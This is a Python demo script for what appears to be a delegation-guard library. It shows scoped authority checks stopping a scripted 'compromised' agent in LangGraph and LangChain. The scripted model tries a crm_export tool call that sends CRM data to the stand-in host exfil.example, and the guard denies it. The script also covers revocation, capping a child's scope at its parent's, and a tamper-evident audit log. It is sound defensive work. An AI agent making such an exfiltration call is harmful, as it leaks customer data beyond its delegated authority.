"""delegation-guard × LangGraph 1.x — runnable demo (no API key needed).

    python examples/integrations/langgraph/demo.py

Tells the canonical "poisoned summarizer" story three times, once per hook
point LangGraph 1.x actually offers:

  1. `ToolNode(wrap_tool_call=...)`      — plain LangGraph, hand-rolled StateGraph
  2. `create_agent(middleware=[...])`    — the LangChain 1.x agent loop
  3. `guard_node(...)` (shipped adapter) — hand-written graph nodes

An offline scripted chat model plays the compromised model: it first makes a
legitimate `crm_query`, then tries to exfiltrate via `crm_export`.
"""
from __future__ import annotations

import sys
from pathlib import Path
from typing import Annotated, TypedDict

sys.path.insert(0, str(Path(__file__).resolve().parent))

from langchain_core.language_models.chat_models import BaseChatModel
from langchain_core.messages import AIMessage, AnyMessage, ToolMessage
from langchain_core.outputs import ChatGeneration, ChatResult
from langchain_core.tools import tool
from langgraph.graph import END, START, StateGraph
from langgraph.graph.message import add_messages
from langgraph.prebuilt import ToolNode, tools_condition

from delegation_guard import (
    AuditLog, Authority, AuthorityDenied, EgressRank, Guard, RowLimit,
)
from delegation_guard.adapters.langchain import GuardedDelegation, ToolPolicy

BAR = "=" * 72
EXECUTED: list[tuple] = []


class ScriptedToolModel(BaseChatModel):
    """A compromised model, scripted. No API key, no network."""

    responses: list
    i: int = 0

    def _generate(self, messages, stop=None, run_manager=None, **kwargs) -> ChatResult:
        message = self.responses[min(self.i, len(self.responses) - 1)]
        self.i += 1
        return ChatResult(generations=[ChatGeneration(message=message)])

    def bind_tools(self, tools, **kwargs):
        return self

    @property
    def _llm_type(self) -> str:
        return "scripted-tool-model"


def call(name, args, call_id):
    return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])


@tool
def crm_query(rows: int) -> str:
    """Read `rows` rows from the CRM."""
    EXECUTED.append(("crm_query", rows))
    return f"{rows} CRM rows"


@tool
def crm_export(destination: str) -> str:
    """Export the CRM to an external destination."""
    EXECUTED.append(("crm_export", destination))          # <- must NEVER happen
    return f"exported to {destination}"


@tool
def send_mail(to: str) -> str:
    """Send an email."""
    EXECUTED.append(("send_mail", to))
    return f"mailed {to}"


TOOLS = [crm_query, crm_export, send_mail]
POLICIES = {
    "crm_query": ToolPolicy("crm.read", lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy("mail.send", lambda a: {"egress": "any"}),
}


def new_chain():
    """Orchestrator holds crm.* + mail.send; summarizer only ever gets crm.read."""
    root = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "mail.send"},
        ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600), task="root")
    summarizer = root.delegate("summarizer", Authority(
        scopes={"crm.read"},
        ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900),
        task="summarize Q3 pipeline")
    return root, summarizer


def poisoned_script():
    return [
        call("crm_query", {"rows": 4200}, "c1"),
        call("crm_export", {"destination": "https://exfil.example/dump"}, "c2"),
        AIMessage(content="Q3 pipeline summarised."),
    ]


def show(out):
    for m in out["messages"]:
        kind = type(m).__name__
        if isinstance(m, ToolMessage):
            flag = "DENIED " if m.status == "error" else "ok     "
            print(f"    {flag} {kind:<12} {m.content}")
        elif getattr(m, "tool_calls", None):
            for tc in m.tool_calls:
                print(f"            {kind:<12} -> calls {tc['name']}({tc['args']})")
        else:
            print(f"            {kind:<12} {m.content!r}")


# ===========================================================================
# 1. plain LangGraph: StateGraph + ToolNode(wrap_tool_call=...)
# ===========================================================================
def build_tool_graph(model, guarded):
    class S(TypedDict):
        messages: Annotated[list[AnyMessage], add_messages]

    def call_model(state: S) -> dict:
        return {"messages": [model.invoke(state["messages"])]}

    g = StateGraph(S)
    g.add_node("model", call_model)
    g.add_node("tools", ToolNode(TOOLS, wrap_tool_call=guarded.wrap_tool_call))
    g.add_edge(START, "model")
    g.add_conditional_edges("model", tools_condition, {"tools": "tools", END: END})
    g.add_edge("tools", "model")
    return g.compile()


def scene_toolnode():
    print(BAR)
    print("1. plain LangGraph — ToolNode(wrap_tool_call=...)")
    print(BAR)
    EXECUTED.clear()
    root, summarizer = new_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    app = build_tool_graph(ScriptedToolModel(responses=poisoned_script()), guarded)
    show(app.invoke({"messages": [("user", "summarize the Q3 pipeline")]}))
    print(f"\n  tool bodies that actually ran: {EXECUTED}")
    print("  -> crm_export never executed: the guard denied it before the body.\n")

    print("  revoking the summarizer subtree, then re-running the same graph...")
    root.revoke(summarizer.node_id)
    EXECUTED.clear()
    app = build_tool_graph(ScriptedToolModel(responses=poisoned_script()), guarded)
    show(app.invoke({"messages": [("user", "summarize the Q3 pipeline")]}))
    print(f"\n  tool bodies that actually ran: {EXECUTED}")
    print("  -> revocation cascades: even the previously-allowed read is denied.\n")
    return root


# ===========================================================================
# 2. LangChain create_agent + middleware
# ===========================================================================
def scene_create_agent():
    print(BAR)
    print("2. LangChain create_agent — AgentMiddleware.wrap_tool_call")
    print(BAR)
    from langchain.agents import create_agent

    EXECUTED.clear()
    root, summarizer = new_chain()
    guarded = GuardedDelegation(summarizer, tools=POLICIES)
    agent = create_agent(
        ScriptedToolModel(responses=poisoned_script()),
        tools=TOOLS,
        middleware=[guarded.middleware()],
    )
    show(agent.invoke({"messages": [("user", "summarize the Q3 pipeline")]}))
    print(f"\n  tool bodies that actually ran: {EXECUTED}")
    print("  -> same gate, same outcome, through the official middleware hook.\n")


# ===========================================================================
# 3. the SHIPPED adapter, on hand-written graph nodes
# ===========================================================================
def scene_shipped_adapter():
    print(BAR)
    print("3. shipped adapter — delegation_guard.adapters.langgraph.guard_node")
    print(BAR)
    from delegation_guard.adapters.langgraph import add_guarded_node, guard_node

    _root, summarizer = new_chain()
    ran: list[str] = []

    class S(TypedDict):
        expected_rows: int
        note: str

    @guard_node(summarizer, "crm.read", context_fn=lambda s: {"rows": s["expected_rows"]})
    def summarize(state: S) -> dict:
        ran.append("summarize")
        return {"note": f"summarised {state['expected_rows']} rows"}

    def export_impl(state: S) -> dict:
        ran.append("export")
        return {"note": "exported"}

    g = StateGraph(S)
    g.add_node("summarize", summarize)
    add_guarded_node(g, "export", summarizer, "crm.export", export_impl,
                     context_fn=lambda s: {"egress": "any"})
    g.add_edge(START, "summarize")
    g.add_edge("summarize", "export")
    g.add_edge("export", END)
    app = g.compile()

    try:
        app.invoke({"expected_rows": 4200, "note": ""})
        print("  !! no denial — unexpected")
    except AuthorityDenied as exc:
        print(f"    ok      node 'summarize' ran")
        print(f"    DENIED  node 'export'    {exc}")
    print(f"\n  node bodies that actually ran: {ran}")
    print("  -> AuthorityDenied propagates straight out of graph.invoke().\n")


# ===========================================================================
def scene_evidence(root: Guard):
    print(BAR)
    print("4. structural guarantee + tamper-evident audit trail")
    print(BAR)
    parent = Guard.issue("orchestrator", Authority(
        scopes={"crm.*", "mail.send"},
        ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600))
    greedy = parent.delegate("greedy", Authority(
        scopes={"crm.*", "mail.send", "admin.*"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")], ttl=999_999),
        task="give me everything")
    print(f"  child requested : admin.*, 10,000,000 rows, ttl 999999")
    print(f"  child GRANTED   : {sorted(greedy.authority.scopes)}, "
          f"{greedy.authority.ceiling('max_rows').max_rows} rows, ttl {greedy.authority.ttl}")
    print(f"  is_narrower_than(parent) = {greedy.authority.is_narrower_than(parent.authority)}")
    print("  -> a child can never be minted wider than its parent.\n")

    print("  delegation tree:")
    for line in _render(root.graph()):
        print("   ", line)

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    print(f"\n  audit entries: {len(entries)}   AuditLog.verify -> {ok} ({err})")
    for e in entries:
        bits = [e["event"]]
        for k in ("agent", "tool", "scope", "reason", "target"):
            if e.get(k):
                bits.append(f"{k}={e[k]}")
        print("    " + "  ".join(bits))

    tampered = [dict(e) for e in entries]
    for e in tampered:
        if e["event"] == "deny":
            e["event"] = "allow"
            break
    ok2, err2 = AuditLog.verify(tampered)
    print(f"\n  flip one 'deny' to 'allow' -> AuditLog.verify -> {ok2} ({err2})")


def _render(graph: dict):
    """`Guard.graph()` returns a flat node list; print it as a tree."""
    for node in sorted(graph["nodes"], key=lambda n: (n["depth"], n["agent"])):
        mark = "  [REVOKED]" if node["revoked"] else ""
        scopes = ",".join(sorted(node["authority"]["scopes"]))
        yield f"{'  ' * node['depth']}- {node['agent']} ({scopes}){mark}"


if __name__ == "__main__":
    root = scene_toolnode()
    scene_create_agent()
    scene_shipped_adapter()
    scene_evidence(root)
